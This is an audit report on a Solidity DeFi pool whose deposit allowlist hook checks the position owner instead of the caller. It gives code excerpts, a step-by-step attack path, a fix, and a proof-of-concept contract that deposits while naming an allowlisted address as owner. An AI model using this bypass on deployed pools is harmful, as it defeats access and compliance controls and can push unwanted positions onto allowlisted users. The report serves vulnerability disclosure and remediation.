Audit Report

## Title
`DepositAllowlistExtension.beforeAddLiquidity` Checks `owner` Instead of `sender`, Allowing Any Unauthorized Caller to Bypass the Deposit Guard — (File: `metric-periphery/contracts/extensions/DepositAllowlistExtension.sol`)

## Summary
`DepositAllowlistExtension.beforeAddLiquidity` silently discards the `sender` argument (the actual token-providing caller) and gates on `owner` (the LP-position recipient). Because `MetricOmmPool.addLiquidity` imposes no `msg.sender == owner` constraint, any address absent from the allowlist can deposit by naming any known allowlisted address as `owner`, fully nullifying the guard.

## Finding Description
**Root cause — wrong parameter checked in the guard**

`DepositAllowlistExtension.beforeAddLiquidity` (L32–42) names the first argument `address,` (unnamed/discarded) and gates on `owner`:

```solidity
function beforeAddLiquidity(address, address owner, uint80, LiquidityDelta calldata, bytes calldata)
    external view override returns (bytes4)
{
    if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][owner]) {
        revert IMetricOmmPoolActions.NotAllowedToDeposit();
    }
    return IMetricOmmExtensions.beforeAddLiquidity.selector;
}
``` [1](#0-0) 

**Root cause — `addLiquidity` imposes no `msg.sender == owner` constraint**

`MetricOmmPool.addLiquidity` (L182–196) accepts a caller-supplied `owner` with no identity check, then forwards `msg.sender` as `sender` and the caller-chosen address as `owner` to the extension hook:

```solidity
_beforeAddLiquidity(msg.sender, owner, salt, deltas, extensionData);
``` [2](#0-1) 

Contrast with `removeLiquidity` (L199–212), which correctly enforces `msg.sender == owner` before proceeding: [3](#0-2) 

**Attack path**

1. Pool admin deploys pool with `DepositAllowlistExtension` in `BEFORE_ADD_LIQUIDITY_ORDER` and allowlists address `A`.
2. Unauthorized address `B` (not on the allowlist) calls `pool.addLiquidity(A, salt, deltas, callbackData, "")`.
3. Pool calls `extension.beforeAddLiquidity(B /*sender*/, A /*owner*/, ...)`.
4. Extension checks `allowedDepositor[pool][A]` → `true` → no revert.
5. `LiquidityLib.addLiquidity` pulls tokens from `B` via the swap callback and credits LP shares to `A`.
6. `B` has deposited into the pool despite being absent from the allowlist; `A` receives LP shares it never requested.

**Existing guards are insufficient:** The only guard in `beforeAddLiquidity` is the `allowedDepositor` check, which is evaluated against `owner` rather than `sender`. There is no secondary check in `addLiquidity` itself that would catch this mismatch.

## Impact Explanation
The deposit allowlist is a core security primitive used to enforce KYC/AML compliance, restrict liquidity to trusted counterparties, or prevent griefing. With the guard misbound to `owner` instead of `sender`:

- **Allowlist is fully nullified.** Any address can deposit by naming any known allowlisted address as `owner`. Allowlisted addresses are discoverable on-chain via `AllowedToDepositSet` events.
- **Forced LP exposure.** An attacker can push LP shares onto an allowlisted address without its consent. If the pool subsequently loses value (impermanent loss, oracle manipulation), the victim bears losses it never agreed to.
- **Admin-boundary break.** The pool admin's configured security perimeter is bypassed by an unprivileged, zero-cost call.

This matches the "Admin-boundary break" and "Broken core pool functionality causing loss of funds" allowed impact categories.

## Likelihood Explanation
No special privileges, flash loans, or complex setup are required. The bypass is executable in a single transaction by any address. Allowlisted addresses are publicly discoverable on-chain. The condition is always reachable whenever a pool is deployed with `DepositAllowlistExtension` and `allowAllDepositors` is not set to `true`.

## Recommendation
Check `sender` (the actual depositing caller) instead of `owner` (the LP-position recipient), mirroring the correct pattern already used in `SwapAllowlistExtension.beforeSwap`: [4](#0-3) 

```solidity
// DepositAllowlistExtension.sol
function beforeAddLiquidity(address sender, address, uint80, LiquidityDelta calldata, bytes calldata)
    external view override returns (bytes4)
{
    if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][sender]) {
        revert IMetricOmmPoolActions.NotAllowedToDeposit();
    }
    return IMetricOmmExtensions.beforeAddLiquidity.selector;
}
```

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

// Setup: pool deployed with DepositAllowlistExtension in BEFORE_ADD_LIQUIDITY_ORDER
// Pool admin called: extension.setAllowedToDeposit(pool, ALICE, true)
// ALICE is allowlisted; BOB is not.

contract BypassDeposit {
    IMetricOmmPool pool;
    IERC20 token0;
    IERC20 token1;

    function attack(address alice, LiquidityDelta calldata deltas) external {
        // BOB calls addLiquidity with owner = ALICE (allowlisted)
        // beforeAddLiquidity receives (BOB, ALICE, ...)
        // checks allowedDepositor[pool][ALICE] → true → no revert
        // tokens pulled from BOB via metricOmmSwapCallback
        // LP shares credited to ALICE
        pool.addLiquidity(
            alice,   // owner = allowlisted address → guard passes
            0,       // salt
            deltas,
            abi.encode(token0, token1, deltas),
            ""
        );
        // BOB has deposited; allowlist is bypassed.
    }

    function metricOmmSwapCallback(int128 amount0Delta, int128 amount1Delta, bytes calldata) external {
        if (amount0Delta > 0) token0.transfer(msg.sender, uint256(int256(amount0Delta)));
        if (amount1Delta > 0) token1.transfer(msg.sender, uint256(int256(amount1Delta)));
    }
}
```

### Citations

**File:** metric-periphery/contracts/extensions/DepositAllowlistExtension.sol (L32-42)
```text
  function beforeAddLiquidity(address, address owner, uint80, LiquidityDelta calldata, bytes calldata)
    external
    view
    override
    returns (bytes4)
  {
    if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][owner]) {
      revert IMetricOmmPoolActions.NotAllowedToDeposit();
    }
    return IMetricOmmExtensions.beforeAddLiquidity.selector;
  }
```

**File:** metric-core/contracts/MetricOmmPool.sol (L188-195)
```text
  ) external nonReentrant(PoolActions.ADD_LIQUIDITY) returns (uint256 amount0Added, uint256 amount1Added) {
    if (deltas.binIdxs.length == 0) return (0, 0);
    if (deltas.binIdxs.length != deltas.shares.length) revert LiquidityDeltaLengthMismatch();
    _beforeAddLiquidity(msg.sender, owner, salt, deltas, extensionData);
    (amount0Added, amount1Added) = LiquidityLib.addLiquidity(
      _liquidityContext(), owner, salt, deltas, callbackData, binTotals, _binStates, _binTotalShares, _positionBinShares
    );
    _afterAddLiquidity(msg.sender, owner, salt, deltas, amount0Added, amount1Added, extensionData);
```

**File:** metric-core/contracts/MetricOmmPool.sol (L206-206)
```text
    if (msg.sender != owner) revert NotPositionOwner();
```

**File:** metric-periphery/contracts/extensions/SwapAllowlistExtension.sol (L31-41)
```text
  function beforeSwap(address sender, address, bool, int128, uint128, uint256, uint128, uint128, bytes calldata)
    external
    view
    override
    returns (bytes4)
  {
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
      revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
    return IMetricOmmExtensions.beforeSwap.selector;
  }
```
